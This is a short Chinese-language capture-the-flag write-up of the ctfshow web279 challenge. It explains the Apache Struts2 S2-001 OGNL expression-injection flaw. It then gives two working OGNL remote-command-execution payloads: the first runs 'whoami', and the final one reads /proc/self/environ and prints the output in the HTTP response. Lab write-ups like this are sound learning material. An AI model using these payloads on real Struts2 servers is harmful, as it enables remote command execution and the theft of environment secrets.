## 写在前面

开始学习java

——KonDream 2022年2月9日20:17:19

## web279(S2-001 RCE)

>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行
>
>- `%`的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值
来到登录页面，进行测试

![image-20220209202027317](image/ctfshow-java(279-300)/image-20220209202027317.png)

提交后回显

![image-20220209202050184](image/ctfshow-java(279-300)/image-20220209202050184.png)

证明漏洞存在

POC：

```java
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().flush(),#f.getWriter().close()
}
```

![image-20220209202405576](image/ctfshow-java(279-300)/image-20220209202405576.png)

最终payload:

```java
%{
#a=(new+java.lang.ProcessBuilder(new+java.lang.String[]{"cat","/proc/self/environ"})).redirectErrorStream(true).start(),
#b=#a.getInputStream(),
#c=new+java.io.InputStreamReader(#b),
#d=new+java.io.BufferedReader(#c),
#e=new+char[50000],
#d.read(#e),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new+java.lang.String(#e)),
#f.getWriter().flush(),#f.getWriter().close()
}
```